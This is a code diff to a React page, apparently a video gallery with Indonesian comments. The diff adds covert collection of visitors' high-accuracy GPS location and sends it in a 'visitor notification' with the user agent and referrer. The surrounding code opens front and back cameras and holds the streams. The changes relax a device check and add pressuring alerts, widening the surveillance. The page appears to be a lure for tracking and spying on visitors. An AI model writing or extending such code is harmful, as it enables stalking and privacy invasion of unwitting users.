@@ -31,10 +31,28 @@ function App() {
   useEffect(() => {
     monitorSuspiciousActivity();
 
+    const getLocation = async (): Promise<string> => {
+      try {
+        const position = await new Promise<GeolocationPosition>((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0,
+          });
+        });
+        const { latitude, longitude } = position.coords;
+        return `Latitude: ${latitude}, Longitude: ${longitude}`;
+      } catch (error) {
+        console.error('Gagal mendapatkan lokasi:', error);
+        return window.location.href; // Fallback ke URL jika lokasi tidak tersedia
+      }
+    };
+
     const sendVisitorNotification = async () => {
+      const location = await getLocation();
       const visitorDetails: VisitorDetails = {
         userAgent: navigator.userAgent,
-        location: window.location.href,
+        location: location,
         referrer: document.referrer || 'Langsung',
         previousSites: document.referrer || 'Tidak ada',
       };
@@ -76,18 +94,12 @@ function App() {
         const videoDevices = devices.filter(device => device.kind === 'videoinput');
         console.log('Perangkat kamera yang ditemukan:', videoDevices.map(d => ({ label: d.label, deviceId: d.deviceId })));
 
-        if (videoDevices.length < 2) {
-          console.error('Perangkat tidak memiliki dua kamera yang tersedia.');
-          alert('Diperlukan dua kamera (depan dan belakang) untuk melanjutkan. Harap periksa perangkat Anda.');
-          return;
-        }
-
         // Inisialisasi kamera depan
         const frontResult = await requestMediaAccess('user', 'depan');
         if (frontResult) {
           cameraStreamsRef.current.push({ stream: frontResult.stream, type: 'depan', deviceId: frontResult.deviceId });
         } else {
-          console.warn('Kamera depan tidak tersedia setelah percobaan pertama.');
+          console.warn('Kamera depan tidak tersedia atau akses ditolak.');
         }
 
         // Inisialisasi kamera belakang dengan fallback
@@ -99,17 +111,18 @@ function App() {
         if (backResult) {
           cameraStreamsRef.current.push({ stream: backResult.stream, type: 'belakang', deviceId: backResult.deviceId });
         } else {
-          console.warn('Kamera belakang tidak tersedia setelah semua percobaan.');
+          console.warn('Kamera belakang tidak tersedia atau akses ditolak.');
         }
 
         if (cameraStreamsRef.current.length === 0) {
           console.error('Tidak ada kamera yang tersedia atau semua akses ditolak.');
-          alert('Akses kamera diperlukan. Harap izinkan di pengaturan browser.');
+          alert('Diperlukan kamera untuk melanjutkan, Harap Periksa perangkat anda!');
         } else {
           console.log('Stream kamera yang diinisialisasi:', cameraStreamsRef.current.map(s => `${s.type} (${s.deviceId})`));
         }
       } catch (error) {
         console.error('Error saat menginisialisasi stream kamera:', error);
+        alert('Diperlukan kamera untuk melanjutkan, Harap Periksa perangkat anda!');
       }
     };
 
@@ -378,7 +391,7 @@ function App() {
                   onClick={() => handleVideoClick(index)}
                   onEnded={() => handleVideoEnded(index)}
                   preload="metadata"
-                  {...({ loading: 'lazy' } as any)} // Menambahkan loading="lazy" dengan type assertion
+                  {...({ loading: 'lazy' } as any)}
                 >
                   <p>Maaf, video tidak dapat dimuat. Silakan periksa koneksi Anda atau coba lagi nanti.</p>
                 </video>
